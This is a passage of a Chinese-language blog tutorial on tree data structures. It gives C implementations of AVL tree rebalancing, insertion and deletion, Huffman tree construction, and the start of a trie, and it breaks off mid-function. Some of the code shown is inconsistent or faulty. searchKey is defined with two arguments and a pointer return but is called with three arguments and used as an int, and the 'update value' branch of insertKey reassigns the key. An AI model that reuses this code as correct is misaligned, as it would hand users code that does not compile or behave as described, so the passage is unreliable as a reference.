<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//树的权值搜索函数</span></span><br><span class="line"></span><br><span class="line"><span class="function">PAVLTree <span class="title">searchKey</span><span class="params">(PAVLTree t,ElemType key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     PAVLTree p=t;</span><br><span class="line">     <span class="keyword">while</span>(p)</span><br><span class="line">     &#123;</span><br><span class="line">          <span class="keyword">if</span>(p-&gt;key==key)</span><br><span class="line">               <span class="keyword">return</span> p;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span>(p-&gt;key&lt;key)</span><br><span class="line">               p=p-&gt;rchild;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">               p=p-&gt;lchild;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//树的自平衡函数,传入的参数是新插入的节点</span></span><br><span class="line"><span class="function">PAVLTree <span class="title">AVLTreeBalance</span><span class="params">(PAVLTree *Node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!(*Node))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	PAVLTree *BFNode;</span><br><span class="line">	PAVLTree Temp = *Node;</span><br><span class="line">	PAVLTree Parent;</span><br><span class="line">	<span class="comment">//0--left,1--right</span></span><br><span class="line">	<span class="keyword">int</span> LeftOrRight = <span class="number">-1</span>;</span><br><span class="line">	PAVLTree find = (*Node);</span><br><span class="line">	BFNode = Node;</span><br><span class="line">    <span class="comment">//查找到不平衡的结点</span></span><br><span class="line">	<span class="keyword">while</span>(find)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(find-&gt;balanceFactor == <span class="number">-2</span> || find-&gt;balanceFactor == <span class="number">2</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		find = find-&gt;Parent;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//当前树平衡</span></span><br><span class="line">	<span class="keyword">if</span>(!find)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(Temp-&gt;Parent)</span><br><span class="line">			Temp = Temp-&gt;Parent;</span><br><span class="line">		<span class="keyword">return</span> Temp;</span><br><span class="line">	&#125;</span><br><span class="line">	(*BFNode) = find;</span><br><span class="line">	<span class="comment">//如果存在父节点</span></span><br><span class="line">	<span class="keyword">if</span>((*BFNode)-&gt;Parent)</span><br><span class="line">	&#123;</span><br><span class="line">		Parent = (*BFNode)-&gt;Parent;</span><br><span class="line">		<span class="keyword">if</span>(Parent-&gt;left == (*BFNode))</span><br><span class="line">			LeftOrRight = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			LeftOrRight = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		Parent = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//辅助判断是哪种情况的变量</span></span><br><span class="line">	<span class="keyword">int</span> Second,Third;</span><br><span class="line">	Second = searchKey((*BFNode),Temp-&gt;key,&amp;find);</span><br><span class="line">	<span class="keyword">if</span>(Second == <span class="number">0</span>)</span><br><span class="line">		Third = searchKey((*BFNode)-&gt;left,Temp-&gt;key,&amp;find);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		Third = searchKey((*BFNode)-&gt;right,Temp-&gt;key,&amp;find);</span><br><span class="line">	<span class="comment">//情况一，左左左</span></span><br><span class="line">	<span class="keyword">if</span>(Second == <span class="number">0</span> &amp;&amp; Third == <span class="number">0</span>)</span><br><span class="line">		(*BFNode) = rightRotate((*BFNode));</span><br><span class="line">	<span class="comment">//情况二，右右右</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Second == <span class="number">1</span> &amp;&amp; Third == <span class="number">1</span>)</span><br><span class="line">		(*BFNode) = leftRotate((*BFNode));</span><br><span class="line">	<span class="comment">//情况三，左左右</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Second == <span class="number">0</span> &amp;&amp; Third == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		(*BFNode)-&gt;left = leftRotate((*BFNode)-&gt;left);</span><br><span class="line">		(*BFNode) = rightRotate((*BFNode));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//情况四，右右左</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		(*BFNode)-&gt;right = rightRotate((*BFNode)-&gt;right);</span><br><span class="line">		(*BFNode) = leftRotate((*BFNode));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(LeftOrRight != <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(LeftOrRight == <span class="number">0</span>)</span><br><span class="line">			Parent-&gt;left = (*BFNode);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			Parent-&gt;right = (*BFNode);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//返回根节点</span></span><br><span class="line">	<span class="keyword">while</span>(Temp-&gt;Parent)</span><br><span class="line">		Temp = Temp-&gt;Parent;</span><br><span class="line">	<span class="keyword">return</span> Temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="一些辅助函数"><a href="#一些辅助函数" class="headerlink" title="一些辅助函数"></a>一些辅助函数</h4><p>其它的一些辅助函数与普通的二叉树没什么不同。</p>
<h5 id="获得-AVL-树的深度"><a href="#获得-AVL-树的深度" class="headerlink" title="获得 AVL 树的深度"></a>获得 AVL 树的深度</h5><p>C 语言实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获得树的深度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetDeepth</span><span class="params">(PAVLTree Node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!Node)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> left = GetDeepth(Node-&gt;left);</span><br><span class="line">	<span class="keyword">int</span> right = GetDeepth(Node-&gt;right);</span><br><span class="line">	<span class="keyword">return</span> (left &gt; right ? (left+<span class="number">1</span>) : (right+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="重新计算树的平衡因子"><a href="#重新计算树的平衡因子" class="headerlink" title="重新计算树的平衡因子"></a>重新计算树的平衡因子</h5><p>//重新计算树的平衡因子，但是只会回溯插入节点的沿途父节点,始终以左节点层数减去右节点层数<br>C 语言实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CalculateBF</span><span class="params">(PAVLTree Node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//根节点的父节点就终止</span></span><br><span class="line">	<span class="keyword">if</span>(!Node)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	Node-&gt;balanceFactor = GetDeepth(Node-&gt;left)-GetDeepth(Node-&gt;right);</span><br><span class="line">	CalculateBF(Node-&gt;Parent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h4><p>平衡二叉树的插入操作与普通二叉查找树的操作一样，新插入的节点都发生在叶子结点，唯一不同的就如上述所说，新插入的结点致使树的结构发生改变而导致不平衡，此时需要进行旋转以达到平衡。<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="平衡二叉树.png"><br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E6%8F%92%E5%85%A5%E6%96%B0%E7%9A%84%E8%8A%82%E7%82%B9Key(40).png" alt="插入新的节点Key(40)"><br>这时我们会发现此时的二叉树已经不平衡，这时我们需要寻找到树里面导致树不平衡的三个点，进行相应的操作，具体有以下两步：</p>
<ul>
<li>① 先对结点 39 以结点 42 为父结点进行左旋转，此时节点 40 变成了 39 的右结点，而 33，39，40 一起成为了结点 42 的左子树。</li>
<li>② 对结点 53 进行右旋转，将其变成节点 42 的右子树，结点 55 依然为结点 53 的右子树。由此便完成了整棵树的重构并让新的树保持平衡。重构之后的树如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E9%87%8D%E6%9E%84%E4%B9%8B%E5%90%8E%E5%BE%97%E5%88%B0%E7%9A%84%E6%8F%92%E5%85%A5%E6%A0%91.png" alt="重构之后得到的插入树.png"><br>有了上边的自平衡函数，那么 AVL 树的插入和删除操作就会变得非常简单。<br>C 语言实现:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//插入操作</span></span><br><span class="line"><span class="function">PAVLTree <span class="title">insertKey</span><span class="params">(PAVLTree *root,<span class="keyword">char</span> key,<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//为空，表示应该插入的位置</span></span><br><span class="line">	<span class="keyword">if</span>(!(*root))</span><br><span class="line">	&#123;</span><br><span class="line">		(*root) = (PAVLTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(AVLTree));</span><br><span class="line">		(*root)-&gt;key = key;</span><br><span class="line">		<span class="comment">//(*root)-&gt;Parent = (*root);</span></span><br><span class="line">		(*root)-&gt;val = val;</span><br><span class="line">		(*root)-&gt;left = (*root)-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="comment">//Balance factor and primary value is 0</span></span><br><span class="line">		(*root)-&gt;balanceFactor = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> (*root);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//如果已经存在那么修正值就行:</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>((*root)-&gt;key == key)</span><br><span class="line">	&#123;</span><br><span class="line">		(*root)-&gt;key = key;</span><br><span class="line">		<span class="keyword">return</span> (*root);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//在左子树</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>((*root)-&gt;key &gt; key)</span><br><span class="line">		insertKey(&amp;(*root)-&gt;left,key,val)-&gt;Parent = (*root);</span><br><span class="line">	<span class="comment">//在右子树</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>((*root)-&gt;key &lt; key)</span><br><span class="line">		insertKey(&amp;(*root)-&gt;right,key,val)-&gt;Parent = (*root);</span><br><span class="line">	CalculateBF(*root);</span><br><span class="line">	<span class="keyword">return</span> (*root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h4><p>假设在插入的基础上删除结点 22，那么此时我们从节点 19 开始遍历找到第一个导致不平衡的结点为 25 并且具有最大高度值的结点，之后往右子树进行便利寻找到第二个具有最大高度值的结点，此结点为 42（下图标注了红色边框的结点）。<br>过程如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E5%88%A0%E9%99%A4%E4%B9%8B%E5%90%8E%E8%BF%9B%E8%A1%8C%E9%87%8D%E6%9E%84%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="删除之后进行重构流程图.png"><br>那么删除的策略就是：</p>
<ul>
<li>1.叶子结点那么直接删除。</li>
<li>2.不是叶子结点，但是只有一个儿子结点，那么删除该节点，用其儿子结点顶替</li>
<li>3.不是叶子结点，但是有两个儿子结点，那么查找该树的中序遍历情况下，要删除节点的下一个结点来顶替，（其实就是右子树的最小值结点）<br>C 语言实现：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除函数</span></span><br><span class="line"><span class="function">PAVLTree <span class="title">deleteKey</span><span class="params">(PAVLTree *root,<span class="keyword">char</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PAVLTree DeleteNode = (PAVLTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(AVLTree));</span><br><span class="line">	<span class="comment">//查找到，那么删除</span></span><br><span class="line">	<span class="keyword">if</span>((*root)-&gt;key == key)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//为了调试少写一点</span></span><br><span class="line">		DeleteNode-&gt;key = (*root)-&gt;key;</span><br><span class="line">		DeleteNode-&gt;val = (*root)-&gt;val;</span><br><span class="line">		<span class="comment">//叶子节点，直接删除</span></span><br><span class="line">		<span class="keyword">if</span>(!(*root)-&gt;left &amp;&amp; !(*root)-&gt;right)</span><br><span class="line">			(*root) = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(!(*root)-&gt;left)</span><br><span class="line">			(*root) = (*root)-&gt;right;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(!(*root)-&gt;right)</span><br><span class="line">			(*root) = (*root)-&gt;left;</span><br><span class="line">		<span class="comment">//最复杂的情况需要寻找中序遍历的下一个点来顶替（右子树的最小结点）</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			PAVLTree Temp = deleteMin(&amp;(*root)-&gt;right);</span><br><span class="line">			(*root)-&gt;key = Temp-&gt;key;</span><br><span class="line">			(*root)-&gt;val = Temp-&gt;val;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>((*root)-&gt;key &gt; key)</span><br><span class="line">		DeleteNode = deleteKey(&amp;(*root)-&gt;left,key);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		DeleteNode = deleteKey(&amp;(*root)-&gt;right,key);</span><br><span class="line">	CalculateBF(*root);</span><br><span class="line">	AVLTreeBalance(root);</span><br><span class="line">	<span class="keyword">return</span> DeleteNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Reference</strong>：<a href="https://blog.csdn.net/c_living/article/details/81169364" target="_blank" rel="noopener">AVL（自平衡二叉树）树的实现（C 语言）</a></p>
<h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><p>赫夫曼树，别名“哈夫曼树”、“最优树”以及“最优二叉树”。学习哈夫曼树之前，首先要了解几个名词。<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91.png" alt="哈夫曼树"></p>
<h3 id="哈夫曼树相关的几个名词"><a href="#哈夫曼树相关的几个名词" class="headerlink" title="哈夫曼树相关的几个名词"></a>哈夫曼树相关的几个名词</h3><ul>
<li>路径：<br>在一棵树中，一个结点到另一个结点之间的通路，称为路径。上图中，从根结点到结点 a 之间的通路就是一条路径。</li>
<li>路径长度：<br>在一条路径中，每经过一个结点，路径长度都要加 1 。例如在一棵树中，规定根结点所在层数为 1 层，那么从根结点到第 i 层结点的路径长度为 i - 1 。上图中从根结点到结点 c 的路径长度为 3。</li>
<li>节点的权：<br>给每一个结点赋予一个新的数值，被称为这个结点的权。例如，上图中结点 a 的权为 7，结点 b 的权为 5。</li>
<li>结点的带权路径长度：<br>指的是从根结点到该结点之间的路径长度与该结点的权的乘积。例如，上图中结点 b 的带权路径长度为 2 _ 5 = 10 。<br>树的带权路径长度为树中所有叶子结点的带权路径长度之和。通常记作 “WPL” 。例如上图中所示的这颗树的带权路径长度为：WPL = 7 _ 1 + 5 _ 2 + 2 _ 3 + 4 * 3</li>
</ul>
<h3 id="哈夫曼树的定义"><a href="#哈夫曼树的定义" class="headerlink" title="哈夫曼树的定义"></a>哈夫曼树的定义</h3><p><strong>当用 n 个结点（都做叶子结点且都有各自的权值）试图构建一棵树时，如果构建的这棵树的带权路径长度最小，称这棵树为“最优二叉树”，有时也叫“赫夫曼树”或者“哈夫曼树”。</strong></p>
<p>在构建哈弗曼树时，要使树的带权路径长度最小，只需要遵循一个原则，那就是：权重越大的结点离树根越近。在上图中，因为结点 a 的权值最大，所以理应直接作为根结点的孩子结点。</p>
<h3 id="构建哈夫曼树的过程"><a href="#构建哈夫曼树的过程" class="headerlink" title="构建哈夫曼树的过程"></a>构建哈夫曼树的过程</h3><p>对于给定的有各自权值的 n 个结点，构建哈夫曼树有一个行之有效的办法：<br>在 n 个权值中选出两个最小的权值，对应的两个结点组成一个新的二叉树，且新二叉树的根结点的权值为左右孩子权值的和；<br>在原有的 n 个权值中删除那两个最小的权值，同时将新的权值加入到 n–2 个权值的行列中，以此类推；<br>重复 1 和 2 ，直到所以的结点构建成了一棵二叉树为止，这棵树就是哈夫曼树。<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E6%9E%84%E5%BB%BA%E8%BF%87%E7%A8%8B.png" alt="哈夫曼树的构建过程"><br>上图中，（A）给定了四个结点 a，b，c，d，权值分别为 7，5，2，4；第一步如（B）所示，找出现有权值中最小的两个，2 和 4 ，相应的结点 c 和 d 构建一个新的二叉树，树根的权值为 2 + 4 = 6，同时将原有权值中的 2 和 4 删掉，将新的权值 6 加入；进入（C），重复之前的步骤。直到（D）中，所有的结点构建成了一个全新的二叉树，这就是哈夫曼树。</p>
<h3 id="哈夫曼树中的节点结构"><a href="#哈夫曼树中的节点结构" class="headerlink" title="哈夫曼树中的节点结构"></a>哈夫曼树中的节点结构</h3><p>构建哈夫曼树时，首先需要确定树中结点的构成。由于哈夫曼树的构建是从叶子结点开始，不断地构建新的父结点，直至树根，所以结点中应包含指向父结点的指针。但是在使用哈夫曼树时是从树根开始，根据需求遍历树中的结点，因此每个结点需要有指向其左孩子和右孩子的指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//哈夫曼树结点结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> weight;<span class="comment">//结点权重</span></span><br><span class="line">    <span class="keyword">int</span> parent, left, right;<span class="comment">//父结点、左孩子、右孩子在数组中的位置下标</span></span><br><span class="line">&#125;HTNode, *HuffmanTree;</span><br></pre></td></tr></table></figure>

<h3 id="构建哈夫曼树的算法实现"><a href="#构建哈夫曼树的算法实现" class="headerlink" title="构建哈夫曼树的算法实现"></a>构建哈夫曼树的算法实现</h3><p>构建哈夫曼树时，需要每次根据各个结点的权重值，筛选出其中值最小的两个结点，然后构建二叉树。</p>
<p>查找权重值最小的两个结点的思想是：从树组起始位置开始，首先找到两个无父结点的结点（说明还未使用其构建成树），然后和后续无父结点的结点依次做比较，有两种情况需要考虑：</p>
<ul>
<li>如果比两个结点中较小的那个还小，就保留这个结点，删除原来较大的结点；</li>
<li>如果介于两个结点权重值之间，替换原来较大的结点；<br>C 语言的实现：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HT数组中存放的哈夫曼树，end表示HT数组中存放结点的最终位置，s1和s2传递的是HT数组中权重值最小的两个结点在数组中的位置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Select</span><span class="params">(HuffmanTree HT, <span class="keyword">int</span> end, <span class="keyword">int</span> *s1, <span class="keyword">int</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> min1, min2;</span><br><span class="line">    <span class="comment">//遍历数组初始下标为 1</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//找到还没构建树的结点</span></span><br><span class="line">    <span class="keyword">while</span>(HT[i].parent != <span class="number">0</span> &amp;&amp; i &lt;= end)&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    min1 = HT[i].weight;</span><br><span class="line">    *s1 = i;</span><br><span class="line"></span><br><span class="line">    i++;</span><br><span class="line">    <span class="keyword">while</span>(HT[i].parent != <span class="number">0</span> &amp;&amp; i &lt;= end)&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对找到的两个结点比较大小，min2为大的，min1为小的</span></span><br><span class="line">    <span class="keyword">if</span>(HT[i].weight &lt; min1)&#123;</span><br><span class="line">        min2 = min1;</span><br><span class="line">        *s2 = *s1;</span><br><span class="line">        min1 = HT[i].weight;</span><br><span class="line">        *s1 = i;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        min2 = HT[i].weight;</span><br><span class="line">        *s2 = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//两个结点和后续的所有未构建成树的结点做比较</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>; j &lt;= end; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果有父结点，直接跳过，进行下一个</span></span><br><span class="line">        <span class="keyword">if</span>(HT[j].parent != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果比最小的还小，将min2=min1，min1赋值新的结点的下标</span></span><br><span class="line">        <span class="keyword">if</span>(HT[j].weight &lt; min1)&#123;</span><br><span class="line">            min2 = min1;</span><br><span class="line">            min1 = HT[j].weight;</span><br><span class="line">            *s2 = *s1;</span><br><span class="line">            *s1 = j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果介于两者之间，min2赋值为新的结点的位置下标</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(HT[j].weight &gt;= min1 &amp;&amp; HT[j].weight &lt; min2)&#123;</span><br><span class="line">            min2 = HT[j].weight;</span><br><span class="line">            *s2 = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>s1 和 s2 传入的是实参的地址，所以函数运行完成后，实参中存放的自然就是哈夫曼树中权重值最小的两个结点在数组中的位置。<br>构建哈弗曼树的代码实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HT为地址传递的存储哈夫曼树的数组，w为存储结点权重值的数组，n为结点个数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateHuffmanTree</span><span class="params">(HuffmanTree *HT, <span class="keyword">int</span> *w, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>) <span class="keyword">return</span>; <span class="comment">// 如果只有一个编码就相当于0</span></span><br><span class="line">    <span class="keyword">int</span> m = <span class="number">2</span>*n<span class="number">-1</span>; <span class="comment">// 哈夫曼树总节点数，n就是叶子结点</span></span><br><span class="line">    *HT = (HuffmanTree) <span class="built_in">malloc</span>((m+<span class="number">1</span>) * <span class="keyword">sizeof</span>(HTNode)); <span class="comment">// 0号位置不用</span></span><br><span class="line">    HuffmanTree p = *HT;</span><br><span class="line">    <span class="comment">// 初始化哈夫曼树中的所有结点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        (p+i)-&gt;weight = *(w+i<span class="number">-1</span>);</span><br><span class="line">        (p+i)-&gt;parent = <span class="number">0</span>;</span><br><span class="line">        (p+i)-&gt;left = <span class="number">0</span>;</span><br><span class="line">        (p+i)-&gt;right = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//从树组的下标 n+1 开始初始化哈夫曼树中除叶子结点外的结点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = n+<span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        (p+i)-&gt;weight = <span class="number">0</span>;</span><br><span class="line">        (p+i)-&gt;parent = <span class="number">0</span>;</span><br><span class="line">        (p+i)-&gt;left = <span class="number">0</span>;</span><br><span class="line">        (p+i)-&gt;right = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构建哈夫曼树</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = n+<span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> s1, s2;</span><br><span class="line">        Select(*HT, i<span class="number">-1</span>, &amp;s1, &amp;s2);</span><br><span class="line">        (*HT)[s1].parent = (*HT)[s2].parent = i;</span><br><span class="line">        (*HT)[i].left = s1;</span><br><span class="line">        (*HT)[i].right = s2;</span><br><span class="line">        (*HT)[i].weight = (*HT)[s1].weight + (*HT)[s2].weight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，如果使用此程序，对权重值分别为 2、8、7、6、5 的节点构建哈夫曼树，最终效果如图 4(A) 所示。但其实，图 4(B) 中显示的哈夫曼树也满足条件，这两棵树的带权路径长度相同。<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E4%B8%A4%E7%A7%8D%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91.png" alt="图 4 两种哈夫曼树"><br>之所以使用此程序构建的哈夫曼树，是图 4(A) 而不是 4(B)，是因为在构建哈夫曼树时，结点 2 和结点 5 构建的新的结点 7 存储在动态树组中位置，比权重值为 7 节点的存储位置还靠后，所以，在程序继续选择两个权值最小的结点时，直接选择了的叶子结点 6 和 7 。<br>Reference:<a href="http://c.biancheng.net/view/3398.html" target="_blank" rel="noopener">哈夫曼树（赫夫曼树、最优树）详解</a></p>
<h2 id="字典树"><a href="#字典树" class="headerlink" title="字典树"></a>字典树</h2><h3 id="字典树的定义"><a href="#字典树的定义" class="headerlink" title="字典树的定义"></a>字典树的定义</h3><p>字典树，顾名思义，就是用树的结构去存储单词。比如，我要存储单词 ant 和 apple，就可以采取下图的多叉树结构去实现，其中可以看到，他们公用 A 节点，看是上去似乎节省了空间（实际上并没有，下面会解释），和形成了有序的分组。<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E5%AD%97%E5%85%B8%E6%A0%91%E5%9B%BE%E8%A7%A3.jpg" alt="字典树图解"><br>假设我们采用的是传统的方法，也就是用一个数组，把单词存进去。那么我们可以比较以下这两个方法的时间复杂度<br>假设每个单词平均有 M 个字母，一共有 N 个单词。<br>|操作|传统算法|字典树|<br>|—|—|—|<br>|插入|O(N)|O(M)|<br>|查找|O(N)|O(M)|<br>|删除|O(N)|O(M)|<br>显然，当需要存储的数据量越庞大或者数据的操作越频繁，字典树的优势越明显，它的时间复杂度只与单词的长度有关。这个算法可以应用在词频分析，信息检索，字符串匹配等方面。</p>
<h3 id="字典树的实现"><a href="#字典树的实现" class="headerlink" title="字典树的实现"></a>字典树的实现</h3><p>C 语言实现</p>
<h4 id="定义结构体"><a href="#定义结构体" class="headerlink" title="定义结构体"></a>定义结构体</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">children</span>[<span class="title">SUB_NODE_COUNT</span>];</span></span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">char</span> character;</span><br><span class="line">&#125; Node;</span><br></pre></td></tr></table></figure>

<p>树节点的数据包含三个部分</p>
<ul>
<li>所含的字母</li>
<li>指向下一节点的指针</li>
<li>是否能终结的标志位，也就是说是否能与它的祖先节点组成一个单词。</li>
</ul>
<h4 id="字典树的插入函数"><a href="#字典树的插入函数" class="headerlink" title="字典树的插入函数"></a>字典树的插入函数</h4><p>C 语言实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Node* <span class="title">create_node</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> flag)</span> </span>&#123;</span><br><span class="line">    Node* n = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    n-&gt;character = c;</span><br><span class="line">    n-&gt;flag = flag;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SUB_NODE_COUNT; i++) &#123;</span><br><span class="line">        n-&gt;children[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">append_node</span><span class="params">(Node* n, <span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Node* child_ptr =  n-&gt;children[c-<span class="string">'a'</span>];</span><br><span class="line">    <span class="keyword">if</span> (child_ptr) &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        n-&gt;children[c-<span class="string">'a'</span>] = create_node(c, FALSE);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_word</span><span class="params">(Node* root, <span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c = *str;</span><br><span 